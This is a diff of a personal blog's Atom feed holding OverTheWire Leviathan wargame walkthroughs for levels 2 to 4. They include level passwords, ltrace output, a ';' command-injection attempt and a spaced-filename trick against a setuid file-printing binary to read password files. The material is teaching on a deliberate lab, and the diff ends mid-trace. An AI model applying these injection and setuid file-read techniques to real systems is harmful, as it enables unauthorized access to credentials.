@@ -1,465 +1,648 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-10T18:02:43+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">The world of Jason Benedetti</title><subtitle>Tech stuff</subtitle><entry><title type="html">Overthewire Natas Level 8 To X</title><link href="http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Level-8-to-x.html" rel="alternate" type="text/html" title="Overthewire Natas Level 8 To X" /><published>2021-04-10T10:20:00+01:00</published><updated>2021-04-10T10:20:00+01:00</updated><id>http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Level-8-to-x</id><content type="html" xml:base="http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Level-8-to-x.html">&lt;h1 id=&quot;level-8&quot;&gt;Level 8&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-18T08:21:27+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">The world of Jason Benedetti</title><subtitle>Tech stuff</subtitle><entry><title type="html">Overthewire Leviathan Level 4 To 5</title><link href="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-4-to-5.html" rel="alternate" type="text/html" title="Overthewire Leviathan Level 4 To 5" /><published>2021-04-17T10:52:00+01:00</published><updated>2021-04-17T10:52:00+01:00</updated><id>http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-4-to-5</id><content type="html" xml:base="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-4-to-5.html">&lt;h1 id=&quot;leviathan-3&quot;&gt;Leviathan 3&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+Username: leviathan4
+Password: vuH0coox6m
 
-&lt;h3 id=&quot;a-wamp-installation-later&quot;&gt;A WAMP installation later..&lt;/h3&gt;
-
-&lt;h2 id=&quot;mmmmkay-looks-like-its-time-to-revert-some-codes&quot;&gt;Mmmmkay, looks like it’s time to revert some codes!&lt;/h2&gt;
-
-&lt;p&gt;Coming soon! Need to sort out a place to write some PHP
-&lt;img src=&quot;images/Pasted%20image%2020210410134227.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Natas" /><summary type="html">Level 8</summary></entry><entry><title type="html">Overthewire Natas Level 0 To 7</title><link href="http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Level-0-to-7.html" rel="alternate" type="text/html" title="Overthewire Natas Level 0 To 7" /><published>2021-04-10T10:10:00+01:00</published><updated>2021-04-10T10:10:00+01:00</updated><id>http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Level-0-to-7</id><content type="html" xml:base="http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Level-0-to-7.html">&lt;h1 id=&quot;natas---what-is-it&quot;&gt;Natas - What is it?&lt;/h1&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Natas
-
-Natas teaches the basics of serverside web-security.
-
-Each level of natas consists of its own website located at **http://natasX.natas.labs.overthewire.org**, where X is the level number. There is **no SSH login**. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.
-
-Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. **All passwords are also stored in /etc/natas\_webpass/**. E.g. the password for natas5 is stored in the file /etc/natas\_webpass/natas5 and only readable by natas4 and natas5.
-
-Start here:
-
-
-Username: natas0
-Password: natas0
-URL:      http://natas0.natas.labs.overthewire.org
+Data for the levels can be found in **the homedirectories**. You can look at **/etc/leviathan\_pass** for the various level passwords.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;ill-be-using-firefox-and-probably-burpsuite-for-these&quot;&gt;I’ll be using FireFox and probably Burpsuite for these.&lt;/h2&gt;
+&lt;h2 id=&quot;lets-take-a-look&quot;&gt;Lets take a look.&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan4@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;leviathan4@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 24
+drwxr-xr-x  3 root root       4096 Aug 26  2019 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 10 root root       4096 Aug 26  2019 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root        220 May 15  2017 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root       3526 May 15  2017 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root        675 May 15  2017 .profile
+dr-xr-x---  2 root leviathan4 4096 Aug 26  2019 .trash
+leviathan4@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .trash
+leviathan4@leviathan:~/.trash&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;i-like-trash-whats-inside&quot;&gt;I like trash. What’s inside?&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bin&quot;&gt;leviathan4@leviathan:~/.trash$ ls
+bin
+leviathan4@leviathan:~/.trash$ ./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;im-not-going-to-find-a-command-for-that-so&quot;&gt;I’m not going to find a command for that. So..&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;https://www.rapidtables.com/convert/number/binary-to-string.html&lt;/li&gt;
+  &lt;li&gt;Paste in the binary code&lt;/li&gt;
+  &lt;li&gt;Victory&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+Tith4cokei
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;VICTORY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Tith4cokei 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Leviathan" /><summary type="html">Leviathan 3 ```</summary></entry><entry><title type="html">Overthewire Leviathan Level 3 To 4</title><link href="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-3-to-4.html" rel="alternate" type="text/html" title="Overthewire Leviathan Level 3 To 4" /><published>2021-04-17T10:51:00+01:00</published><updated>2021-04-17T10:51:00+01:00</updated><id>http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-3-to-4</id><content type="html" xml:base="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-3-to-4.html">&lt;h1 id=&quot;leviathan-3&quot;&gt;Leviathan 3&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+Username: leviathan3
+Password: Ahdiemoo1j
+
+Data for the levels can be found in **the homedirectories**. You can look at **/etc/leviathan\_pass** for the various level passwords.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;lets-take-a-look&quot;&gt;Lets take a look.&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan3@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;level3
+leviathan3@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./level3
+Enter the password&amp;gt; qwerty
+bzzzzzzzzap. WRONG
+leviathan3@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./level3
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x8048618, 1, 0xffffd794, 0x80486d0 &amp;lt;unfinished ...&amp;gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;h0no33&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;kakaka&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Enter the password&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20
+fgets&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Enter the password&amp;gt; kakaka
+&lt;span class=&quot;s2&quot;&gt;&quot;kakaka&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, 256, 0xf7fc55a0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffd5a0
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kakaka&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;snlprintf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
+puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bzzzzzzzzap. WRONG&quot;&lt;/span&gt;bzzzzzzzzap. WRONG
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 19
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;sweet-free-password-round-2&quot;&gt;Sweet. Free password. Round 2&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan3@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./level3
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x8048618, 1, 0xffffd794, 0x80486d0 &amp;lt;unfinished ...&amp;gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;h0no33&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;kakaka&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Enter the password&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20
+fgets&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Enter the password&amp;gt; snlprintf
+&lt;span class=&quot;s2&quot;&gt;&quot;snlprintf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, 256, 0xf7fc55a0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffd5a0
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;snlprintf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;snlprintf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[You&apos;ve got shell]!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;You&lt;span class=&quot;s1&quot;&gt;&apos;ve got shell]!
+)                                                    = 20
+geteuid()                                                                      = 12003
+geteuid()                                                                      = 12003
+setreuid(12003, 12003)                                                         = 0
+system(&quot;/bin/sh&quot;$
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;much-easier-than-3---but-lets-clear-it-up&quot;&gt;Much easier than #3 - But lets clear it up.&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan3@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./level3
+Enter the password&amp;gt; kakaka
+bzzzzzzzzap. WRONG
+leviathan3@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./level3
+Enter the password&amp;gt; snlprintf
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;You&lt;span class=&quot;s1&quot;&gt;&apos;ve got shell]!
+$ whoami
+leviathan4
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;VICTORY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuH0coox6m 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Leviathan" /><summary type="html">Leviathan 3 ```</summary></entry><entry><title type="html">Overthewire Leviathan Level 2 To 3</title><link href="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-2-to-3.html" rel="alternate" type="text/html" title="Overthewire Leviathan Level 2 To 3" /><published>2021-04-17T10:50:00+01:00</published><updated>2021-04-17T10:50:00+01:00</updated><id>http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-2-to-3</id><content type="html" xml:base="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-2-to-3.html">&lt;h1 id=&quot;leviathan-2&quot;&gt;Leviathan 2&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+Username: leviathan2
+Password: ougahZi8Ta
+
+Data for the levels can be found in **the homedirectories**. You can look at **/etc/leviathan\_pass** for the various level passwords.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;lets-take-a-look&quot;&gt;Lets take a look&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;printfile
+leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./printfile
+&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; File Printer &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
+Usage: ./printfile filename
+leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./printfile hello
+You cant have that file...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;lets-see-if-we-can-escape&quot;&gt;Lets see if we can escape..&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./printfile hello&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+You cant have that file...
+total 28
+drwxr-xr-x  2 root       root       4096 Aug 26  2019 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root       root        220 May 15  2017 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root       root       3526 May 15  2017 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root       root        675 May 15  2017 .profile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;did-stuff-cant-access-file-lets-trace-again&quot;&gt;DId stuff, can’t access file. Lets trace again.&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./printfile ../../etc/leviathan_pass/leviathan2
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x804852b, 2, 0xffffd754, 0x8048610 &amp;lt;unfinished ...&amp;gt;
+access&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;../../etc/leviathan_pass/leviath&quot;&lt;/span&gt;..., 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+snprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat ../../etc/leviathan_pas&quot;&lt;/span&gt;..., 511, &lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat %s&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;../../etc/leviathan_pass/leviath&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 44
+geteuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 12002
+geteuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 12002
+setreuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;12002, 12002&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat ../../etc/leviathan_pas&quot;&lt;/span&gt;...ougahZi8Ta
+ &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;mmmm-okay-lets-try-something&quot;&gt;Mmmm, okay. Lets try something.&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/zd3l
+leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/zd3l
+leviathan2@leviathan:/tmp/zd3l&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;password plz.txt&quot;&lt;/span&gt;
+leviathan2@leviathan:/tmp/zd3l&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;password.txt
+leviathan2@leviathan:/tmp/zd3l&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/leviathan2
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;lets-trace-passwordtxt&quot;&gt;Lets trace password.txt&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./printfile &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/zd3l/password.txt&quot;&lt;/span&gt;
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x804852b, 2, 0xffffd764, 0x8048610 &amp;lt;unfinished ...&amp;gt;
+access&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/tmp/zd3l/password.txt&quot;&lt;/span&gt;, 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+snprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat /tmp/zd3l/password.txt&quot;&lt;/span&gt;, 511, &lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat %s&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/zd3l/password.txt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 31
+geteuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 12002
+geteuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 12002
+setreuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;12002, 12002&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat /tmp/zd3l/password.txt&quot;&lt;/span&gt; &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;what-happens-if-we-do-a-spaced-file-name&quot;&gt;What happens if we do a spaced file name?&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./printfile &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/zd3l/password plz.txt&quot;&lt;/span&gt;
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x804852b, 2, 0xffffd754, 0x8048610 &amp;lt;unfinished ...&amp;gt;
+access&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/tmp/zd3l/password plz.txt&quot;&lt;/span&gt;, 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+snprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat /tmp/zd3l/password plz.&quot;&lt;/span&gt;..., 511, &lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat %s&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/zd3l/password plz.txt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 35
+geteuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 12002
+geteuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 12002
+setreuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;12002, 12002&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
